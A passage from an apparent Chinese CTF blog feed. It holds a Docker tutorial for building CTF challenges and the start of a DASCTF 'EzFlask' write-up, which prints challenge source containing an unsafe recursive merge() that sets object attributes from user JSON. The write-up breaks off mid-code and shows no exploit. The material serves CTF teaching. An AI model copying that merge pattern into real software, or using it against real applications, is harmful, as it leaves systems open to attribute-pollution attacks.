-<span class="built_in">id</span> --name dockername1 -p 180:80 tutum/lamp</span></span><br><span class="line">//创建tutum/lamp服务器，命名为dockername1，开放<span class="number">180</span>端口供访问</span><br></pre></td></tr></table></figure><p><strong>4.普通题目复制</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">把文件拉到linux目录下</span><br><span class="line">docker cp 文件名 docker名<span class="symbol">:/var/www/html</span>   </span><br><span class="line">/<span class="regexp">/把文件复制到docker的/var</span><span class="regexp">/www/html</span>目录下，记得命名一个index.php，文件的其他人权限得设置成可读</span><br></pre></td></tr></table></figure><p><strong>5.（可有可无）进入docker查看</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it docker名 <span class="regexp">/bin/</span>bash  </span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>进入之后就随便命令执行就好了，没问题就访问宿主机ip+端口看看，能访问就没问题</span><br></pre></td></tr></table></figure><h3 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h3><p><strong>查看docker容器状态</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">ps</span>  </span><br><span class="line">docker <span class="built_in">ps</span> <span class="literal">-a</span></span><br></pre></td></tr></table></figure><p><strong>查看docker镜像状态</strong></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker images</span></span><br></pre></td></tr></table></figure><p><strong>新建docker容器</strong></p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span> -id --name 起个名 -p 开放端口:映射端口 tutum/lamp</span><br><span class="line"><span class="meta">#映射端口前首先确定端口没有被占用</span></span><br><span class="line"><span class="meta">#-d <span class="comment">//容器后台运行。</span></span></span><br><span class="line"><span class="meta">#-p <span class="comment">//指定映射端口。</span></span></span><br><span class="line"><span class="meta">#-P <span class="comment">//随机映射高端口</span></span></span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> run -d -p <span class="number">9999</span>:<span class="number">80</span> tutum/lamp</span><br></pre></td></tr></table></figure><p><strong>复制文件进入docker</strong></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker cp [本地路径] [container id]<span class="symbol">:</span>[container 路径]</span><br><span class="line">例如:</span><br><span class="line">docker cp flag.php docker名字<span class="symbol">:/var/www/html</span></span><br></pre></td></tr></table></figure><p><strong>查询宿主机ip</strong></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ifconfig</span></span><br></pre></td></tr></table></figure><p><strong>进入指定docker</strong></p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it docker名字 <span class="keyword">/bin/</span>bash</span><br><span class="line"><span class="meta">#如果从这个容器退出，不会导致容器的停止，推荐使用 docker exec</span></span><br><span class="line"><span class="meta">#-i <span class="comment">//让容器的标准输入保持打开。</span></span></span><br><span class="line"><span class="meta">#-t <span class="comment">//让docker分配一个伪终端并绑定到容器的标准输出上。</span></span></span><br></pre></td></tr></table></figure><p><strong>退出当前docker容器</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure><p><strong>导出容器</strong></p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">docker</span> ex<span class="keyword">port</span> [dockerID] &gt; Find.tar</span><br></pre></td></tr></table></figure><p><strong>启动容器</strong></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="literal">start</span> 容器ID</span><br></pre></td></tr></table></figure><p><strong>查看所有存在的容器</strong></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">container</span> <span class="keyword">ls</span> -a</span><br></pre></td></tr></table></figure><p><strong>删除容器</strong></p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker rm [<span class="built_in">container</span> id]或者是[<span class="built_in">container</span> name]</span><br><span class="line"><span class="meta">#需要先把容器停掉</span></span><br></pre></td></tr></table></figure><h2 id="模板介绍"><a href="#模板介绍" class="headerlink" title="模板介绍"></a>模板介绍</h2><p>十分感谢nss的师傅提供的模板啦，这里附上链接</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/CTF-Archives/</span>ctf-docker-template</span><br></pre></td></tr></table></figure><h2 id="利用dockerfile和docker-compose出题"><a href="#利用dockerfile和docker-compose出题" class="headerlink" title="利用dockerfile和docker-compose出题"></a>利用dockerfile和docker-compose出题</h2><p>这里感谢f12大佬提供的帮助</p><h3 id="这俩东西是什么？"><a href="#这俩东西是什么？" class="headerlink" title="这俩东西是什么？"></a>这俩东西是什么？</h3><p>在此之前，我们先来明确两个个概念;</p><p>（1）镜像：<br>什么是镜像？当我们在虚拟机启动docker后，运行docker images，我们所看到的就是我们docker里所拥有的镜像</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/eb83d995c2a91cec54d44f0f93191b9.png" alt=""></p><p>上面的五列依次是 镜像名称  镜像标签  镜像id  镜像创建时间  镜像大小</p><p>（2）容器：</p><p>镜像是用来干什么的呢？当然是创建容器啦，当我们输入docker ps(查看在运行的容器)或者docker ps -a(查看所有容器)就可以看到容器</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/b0e20b86ca59ba33927055323c6f6c1.png" alt=""></p><p>了解了这些基础，我们就可以继续下面的内容了</p><h4 id="先介绍dockerfile"><a href="#先介绍dockerfile" class="headerlink" title="先介绍dockerfile:"></a><strong>先介绍dockerfile:</strong></h4><p>dockerfile将一些需要执行的命令存储在这个文件中,在需要的时候自动执行。我们应该如何使用这个文件捏？这个时候就要提到docker builid这个指令了，使用格式如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker build -t <span class="tag">&lt;<span class="name">镜像名称</span>&gt;</span>:<span class="tag">&lt;<span class="name">镜像标签</span>&gt;</span> <span class="tag">&lt;<span class="name">上下文路径</span>&gt;</span></span><br><span class="line">例如：</span><br><span class="line">docker build -t sql:v1 .</span><br><span class="line">这里的.是当前目录的意思，这主要是给docker一个引用路径，告诉docker你需要的文件都在当前目录以及其子目录下</span><br></pre></td></tr></table></figure><p>通常情况下，该命令会自动搜索.及其子目录下的名为dockerfile的文件</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">-f 路径</span></span><br><span class="line">此方法可以指定文件作为dockerfile使用</span><br></pre></td></tr></table></figure><p>参考博客：<a href="https://blog.csdn.net/m0_46090675/article/details/121846718?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169046011616800180651767%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169046011616800180651767&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-121846718-null-null.142^v91^insertT0,239^v3^insert_chatgpt&amp;utm_term=dockerfile&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/m0_46090675/article/details/121846718?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169046011616800180651767%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169046011616800180651767&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-121846718-null-null.142^v91^insertT0,239^v3^insert_chatgpt&amp;utm_term=dockerfile&amp;spm=1018.2226.3001.4187</a></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/17c52f8981f341a48dc82ab82918461e.png" alt=""></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/b370884a35ec495dbe708fd704598e9b.png" alt=""></p><p><strong>对于以下代码的理解可以参考NSS的模板web-nginx-mysql-php73，附上截图</strong></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230727231741.png" alt=""></p><h5 id="FROM"><a href="#FROM" class="headerlink" title="FROM"></a>FROM</h5><p>指定基础镜像，必须为第一个命令</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">格式：</span><br><span class="line">　　FROM <span class="symbol">&lt;image&gt;</span></span><br><span class="line">　　FROM <span class="symbol">&lt;image&gt;</span>:<span class="symbol">&lt;tag&gt;</span></span><br><span class="line">　　FROM <span class="symbol">&lt;image&gt;</span>@<span class="symbol">&lt;digest&gt;</span></span><br><span class="line"></span><br><span class="line">示例：　　</span><br><span class="line">FROM mysq<span class="variable">l:5</span>.<span class="number">6</span></span><br><span class="line">注：</span><br><span class="line">   <span class="keyword">tag</span>或digest是可选的，如果不使用这两个值时，会使用latest版本的基础镜像</span><br></pre></td></tr></table></figure><h5 id="RUN"><a href="#RUN" class="headerlink" title="RUN"></a>RUN</h5><p>构建镜像时执行的命令</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span>用于在构建镜像时执行命令，其有以下两种命令执行方式：</span><br><span class="line"><span class="keyword">shell</span>执行</span><br><span class="line">格式：</span><br><span class="line">    <span class="keyword">RUN</span> &lt;command&gt;</span><br><span class="line">exec执行</span><br><span class="line">格式：</span><br><span class="line">    <span class="keyword">RUN</span> [<span class="string">&quot;executable&quot;</span>, <span class="string">&quot;param1&quot;</span>, <span class="string">&quot;param2&quot;</span>]</span><br><span class="line">示例：</span><br><span class="line">    <span class="keyword">RUN</span> [<span class="string">&quot;executable&quot;</span>, <span class="string">&quot;param1&quot;</span>, <span class="string">&quot;param2&quot;</span>]</span><br><span class="line">    <span class="keyword">RUN</span> apk <span class="keyword">update</span></span><br><span class="line">    <span class="keyword">RUN</span> [<span class="string">&quot;/etc/execfile&quot;</span>, <span class="string">&quot;arg1&quot;</span>, <span class="string">&quot;arg1&quot;</span>]</span><br><span class="line">注：<span class="keyword">RUN</span>指令创建的中间镜像会被缓存，并会在下次构建中使用。如果不想使用这些缓存镜像，</span><br><span class="line">可以在构建时指定--<span class="keyword">no</span>-cache参数，如：docker build --<span class="keyword">no</span>-cache</span><br></pre></td></tr></table></figure><h5 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h5><p>将本地文件添加到容器中，tar类型文件会自动解压(网络压缩资源不会被解压)，可以访问网络资源，类似wget</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">格式：</span><br><span class="line">    <span class="built_in">ADD</span> &lt;src&gt;<span class="built_in">..</span>. &lt;dest&gt;</span><br><span class="line">    <span class="built_in">ADD</span> [<span class="string">&quot;&lt;src&gt;&quot;</span>,<span class="built_in">..</span>. <span class="string">&quot;&lt;dest&gt;&quot;</span>] 用于支持包含空格的路径</span><br><span class="line">示例：</span><br><span class="line">    <span class="built_in">ADD</span> hom* /mydir/          # 添加所有以<span class="string">&quot;hom&quot;</span>开头的文件</span><br><span class="line">    <span class="built_in">ADD</span> hom?.txt /mydir/      # ? 替代一个单字符,例如：<span class="string">&quot;home.txt&quot;</span></span><br><span class="line">    <span class="built_in">ADD</span> test relativeDir/     # 添加 <span class="string">&quot;test&quot;</span> 到 `WORKDIR`/relativeDir/</span><br><span class="line">    <span class="built_in">ADD</span> test /absoluteDir/    # 添加 <span class="string">&quot;test&quot;</span> 到 /absoluteDir/</span><br></pre></td></tr></table></figure><h5 id="COPY"><a href="#COPY" class="headerlink" title="COPY"></a>COPY</h5><p>功能类似ADD，但是是不会自动解压文件，也不能访问网络资源</p><h5 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h5><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">格式：</span><br><span class="line">    <span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;executable&quot;</span>,<span class="string">&quot;param1&quot;</span>,<span class="string">&quot;param2&quot;</span>] (执行可执行文件，优先)</span></span><br><span class="line">    <span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;param1&quot;</span>,<span class="string">&quot;param2&quot;</span>] (设置了ENTRYPOINT，则直接调用ENTRYPOINT添加参数)</span></span><br><span class="line">    <span class="keyword">CMD</span><span class="language-bash"> <span class="built_in">command</span> param1 param2 (执行shell内部命令)</span></span><br><span class="line">示例：</span><br><span class="line">    <span class="keyword">CMD</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;This is a test.&quot;</span> | <span class="built_in">wc</span> -l</span></span><br><span class="line">    <span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/usr/bin/wc&quot;</span>,<span class="string">&quot;--help&quot;</span>]</span></span><br><span class="line"></span><br><span class="line">注：<span class="keyword">CMD</span><span class="language-bash">不同于RUN，CMD用于指定在容器启动时所要执行的命令，而RUN用于指定镜像构建时所要执行的命令。</span></span><br></pre></td></tr></table></figure><h4 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose:"></a><strong>docker-compose:</strong></h4><p>docker-compse像是一个中控系统，他可以控制由他启动的所有容器，同时启动、同时关闭、同时删除等，命名一般为xxxxx.yaml，内容格式如下，以NSS模板web-nginx-mysql-php73为例</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230727224529.png" alt=""></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">重点关注services部分，缩进一次的web和www为镜像名，缩进两次的为容器参数，例如开放端口、映射端口、容器名、启动的dockerfile位置（<span class="keyword">build</span>参数），这样可以实现同时启动多个不同容器。</span><br></pre></td></tr></table></figure><p><strong>启动命令</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在该目录下执行</span><br><span class="line">docker-compose up -d</span><br><span class="line">docker-compose -f docker-compose.yml up -d   <span class="regexp">//</span>指定目录</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230728133207.png" alt=""></p><p>这里就可以清楚的看到，我们执行docker-compose up -d后，启动了name4和name5这两个容器，然后构建了docker_www和docker_web这两个服务器镜像，此处的镜像是可以通过上述run命令二次使用的，注意docker-compose只能管理由docker-compose所启动的容器，而run启动的是不可以控制的。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker-compose restart   <span class="regexp">//</span>重启服务容器。</span><br><span class="line">docker-compose start     <span class="regexp">//</span>启动服务容器。</span><br><span class="line">docker-compose stop      <span class="regexp">//</span>停止服务容器。</span><br><span class="line">docker-compose rm        <span class="regexp">//</span>删除服务（停止状态）容器。</span><br><span class="line">docker-compose down      <span class="regexp">//</span>停止并删除所有服务的容器、网络、镜像、数据卷。</span><br><span class="line">docker-compose images    <span class="regexp">//</span>打印服务容器所对应的镜像。</span><br></pre></td></tr></table></figure><h4 id="出题建议-web-nginx-mysql-php73"><a href="#出题建议-web-nginx-mysql-php73" class="headerlink" title="出题建议(web-nginx-mysql-php73)"></a>出题建议(web-nginx-mysql-php73)</h4><h5 id="基本框架"><a href="#基本框架" class="headerlink" title="基本框架"></a><strong>基本框架</strong></h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── docker</span><br><span class="line">│   └── docker-compose<span class="selector-class">.yml</span></span><br><span class="line">├── Dockerfile</span><br><span class="line">├── db<span class="selector-class">.sql</span></span><br><span class="line">├── service</span><br><span class="line">│   └── docker-entrypoint<span class="selector-class">.sh</span></span><br><span class="line">└── <span class="attribute">src</span></span><br><span class="line">├── shell<span class="selector-class">.php</span></span><br><span class="line">├── index<span class="selector-class">.php</span></span><br><span class="line">├── flag<span class="selector-class">.php</span></span><br><span class="line">├── connect<span class="selector-class">.php</span></span><br><span class="line">├── source</span><br><span class="line">└── assets</span><br><span class="line">└── bootstrap</span><br><span class="line">├── css</span><br><span class="line">└── js</span><br></pre></td></tr></table></figure><p>附上大佬的讲解视频，非常详细</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.bilibili.com<span class="regexp">/video/</span>BV1xW4y1Z7aa/?spm_id_from=<span class="number">333.999</span>.<span class="number">0.0</span>&amp;vd_source=<span class="number">757</span>ded406aff262d5f6010cb1a347a9a</span><br></pre></td></tr></table></figure><p>题目框架已经是非常完整的了，只需要按照自己的需求稍加修改就可以轻松出题啦！</p><h5 id="删除部分"><a href="#删除部分" class="headerlink" title="删除部分"></a><strong>删除部分</strong></h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shell<span class="selector-class">.php</span></span><br><span class="line">flag<span class="selector-class">.php</span></span><br><span class="line">docker-compose.yml中的环境变量设置</span><br><span class="line"></span><br><span class="line">以上部分为测试用途，没用一定得删，防止出现非预期解</span><br></pre></td></tr></table></figure><h5 id="修改部分"><a href="#修改部分" class="headerlink" title="修改部分"></a><strong>修改部分</strong></h5><p>（1）：connect.php</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">主要用于数据库连接，其中的参数可以进行修改，但一定注意要和dockerfile中的参数值保持一致，二者必须同时修改</span><br></pre></td></tr></table></figure><p>（2）：index.php、docker-entrypoint.sh、docker-compose.yaml</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">这三者主要是用于个性化的修改：</span><br><span class="line"></span><br><span class="line"><span class="keyword">index</span>.php不必多说，主要是完善你自己想出的<span class="keyword">sql</span>语句以及过滤等</span><br><span class="line"></span><br><span class="line">docker-entrypoint.sh 里面有两种flag的生成格式，可以根据自己的需要进行修改</span><br><span class="line"></span><br><span class="line">docker-compose.yaml 可以调整开启的端口以及环境变量等因素</span><br></pre></td></tr></table></figure><p>（3）：Dockerfile</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">根据上述介绍，将自己所需要执行的操作写入dockerfile，不放心的话可以自己本地测试一下</span><br></pre></td></tr></table></figure><p><strong>启动</strong></p><p>完成上述操作后就可以启动容器啦，方法有2：</p><p>（1）：如果只有一个容器，可以直接在你的dockerfile目录使用docker build命令进行创建</p><p>（2）：如果有多个容器需要用到compose，那么可以在.yaml目录中执行docker-compose up -d</p>]]></content>
    
    
    <summary type="html">致力于帮助新手和小白滴docker教程</summary>
    
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/categories/CTF/"/>
    
    <category term="出题教程" scheme="https://bowuchuling.github.io/categories/CTF/%E5%87%BA%E9%A2%98%E6%95%99%E7%A8%8B/"/>
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/tags/CTF/"/>
    
    <category term="教程" scheme="https://bowuchuling.github.io/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF WEB WP</title>
    <link href="https://bowuchuling.github.io/posts/54ff006d.html"/>
    <id>https://bowuchuling.github.io/posts/54ff006d.html</id>
    <published>2023-07-25T10:52:33.026Z</published>
    <updated>2023-08-13T12:07:31.499Z</updated>
    
    <content type="html"><![CDATA[<h2 id="EzFlask"><a href="#EzFlask" class="headerlink" title="EzFlask"></a>EzFlask</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> self.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> self.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span 